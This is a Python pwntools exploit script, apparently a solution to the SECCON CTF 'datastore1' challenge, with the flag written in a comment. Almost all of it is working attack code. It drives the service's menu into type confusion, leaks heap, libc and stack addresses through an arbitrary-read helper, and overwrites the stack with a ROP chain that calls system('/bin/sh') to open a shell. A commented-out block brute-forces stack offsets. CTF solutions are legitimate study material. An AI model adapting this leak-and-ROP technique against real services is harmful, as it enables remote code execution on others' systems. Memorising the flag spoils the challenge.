from pwn import *

# flag: SECCON{'un10n'_15_4_m4g1c_b0x}

# p = remote('localhost', 9000)
p = remote('datastore1.seccon.games', 4585)
# context.log_level = 'debug'

p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'> ', b'a')
p.sendlineafter(b': ', b'7')

p.sendlineafter(b'> ', b'1')
p.sendlineafter(b': ', b'0')
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'> ', b'a')
p.sendlineafter(b': ', b'4')

p.sendlineafter(b'> ', b'1')
p.sendlineafter(b': ', b'1')
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'> ', b'v')
p.sendlineafter(b': ', b'aaaa')

p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'index: ', b'1')
p.sendlineafter(b'> ', b'2')

p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'index: ', b'1')
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'> ', b'a')
p.sendlineafter(b': ', b'4')

p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'index: ', b'2')
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'> ', b'v')
p.sendlineafter(b'value: ', b'b'*0x30)

p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'index: ', b'1')
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'index: ', b'4')
p.sendlineafter(b'> ', b'2')

p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'index: ', b'1')
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'index: ', b'4')
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'> ', b'v')
p.sendlineafter(b'value: ', b'c'*0x10)

p.sendlineafter(b'> ', b'2')
p.recvlines(12)
p.recvuntil(b'[02] <S> ')
hbase = u64(p.recvline()[:-1].ljust(8, b'\x00')) - 0x390
log.info("hleak: %#x", hbase)



p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'index: ', b'6')
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'> ', b'a')
p.sendlineafter(b'size: ', b'8')

for i in range(8):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'index: ', b'6')
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'index: ', str(i).encode())
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'> ', b'a')
    p.sendlineafter(b'size: ', b'8')

p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'index: ', b'6')
p.sendlineafter(b'> ', b'2')

# libc address at heap + 0x550


def read_addr(addr):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'index: ', b'2')
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'bytes): ', p64(hbase + 0x478) + p64(0x50) + p64(addr))

    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'index: ', b'1')
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'index: ', b'4')
    p.sendlineafter(b'> ', b'1')
    p.recvuntil(b'Current: <S> ')
    leak = p.recvuntil(b'\nnew string')[:-len(b'\nnew string')]
    p.sendlineafter(b'bytes): ', leak)
    return leak

lbase = u64(read_addr(hbase + 0x550).ljust(8, b'\x00')) - 0x219ce0
log.info("lleak: %#x", lbase)

stack = u64(read_addr(lbase + 0x221200).ljust(8, b'\x00'))
log.info("env: %#x", stack)

# this works locally

# saddr = (stack & ~0xf) - 0x230 # 0x300
saddr = stack - 0x230
log.info("saddr: %#x", saddr)

p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'index: ', b'2')
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'bytes): ', p64(hbase + 0x478) + p64(0x100) + p64(saddr))

# context.log_level = 'debug'
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'index: ', b'1')
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'index: ', b'4')
p.sendlineafter(b'> ', b'1')

pop_rdi_ret = lbase + 0x1bc061
ret = pop_rdi_ret + 1

rop = b''
rop += p64(ret) # * (0x2d0 // 8)
rop += p64(pop_rdi_ret)
rop += p64(lbase + 0x1d8698)
rop += p64(lbase + 0x50d60)

p.sendlineafter(b'bytes): ', rop)

"""

# random stuff

# leak memory
def read_addr1(addr):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'index: ', b'2')
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'bytes): ', p64(hbase + 0x478) + p64(0x50) + p64(addr))

    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'index: ', b'1')
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'index: ', b'4')
    p.sendlineafter(b'> ', b'1')
    p.recvuntil(b'Current: <S> ')
    leak = p.recvuntil(b'\nnew string')[:-len(b'\nnew string')]
    p.sendlineafter(b'bytes): ', b'b'*8)
    log.info("leak: %s", leak.hex())
    return leak

# 0x29d90
i = 0x230
while True:
    ll = u64(read_addr1(stack - i).ljust(8, b'\x00')[:8])
    log.info("addr: %#x, off: %#x, ll: %#x", stack - i, i, ll)
    if ll == lbase + 0x29d90:
        log.info("matched!!")
        break
    i += 0x10
"""

p.interactive()
